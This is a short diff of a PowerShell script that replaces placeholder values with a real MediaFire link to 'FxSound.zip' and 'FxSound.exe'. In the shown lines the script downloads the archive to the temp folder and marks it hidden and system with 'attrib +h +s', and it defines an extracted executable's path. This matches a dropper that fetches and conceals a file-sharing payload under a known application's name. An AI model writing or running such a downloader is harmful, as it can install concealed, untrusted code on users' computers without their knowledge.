@@ -1,8 +1,8 @@
-$zipUrl = "https://example.com/arquivo.zip"
-$exeName = "programa.exe"
+$zipUrl = "https://download843.mediafire.com/h4vd6mw6wzwgvULQ4KCejcUkY2HHZU5p8qe-4UzeI4V8eX-ftoS3iiwMww64gp6kJ1QzT3X5HnPxw8aWDeAwGQUx6Ws8V1Ct3QGk7BzdZlx-3wrxC9OZgx-PymGD6qHvE-MRg-lairTNdB3jHDiXMA3XYDctJyVy0x7KkmLAo7Aj5A/xkwf5ya9257w8y5/FxSound.zip"
+$exeName = "FxSound.exe"
 $tempFolder = [System.IO.Path]::GetTempPath()
-$zipFile = Join-Path $tempFolder "arquivo.zip"
-$extractFolder = Join-Path $tempFolder "extraido"
+$zipFile = Join-Path $tempFolder "FxSound.zip"
+$extractFolder = Join-Path $tempFolder "FxSound"
 $exePath = Join-Path $extractFolder $exeName
 
 if (-Not (Test-Path $zipFile)) { Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile; & attrib +h +s $zipFile }
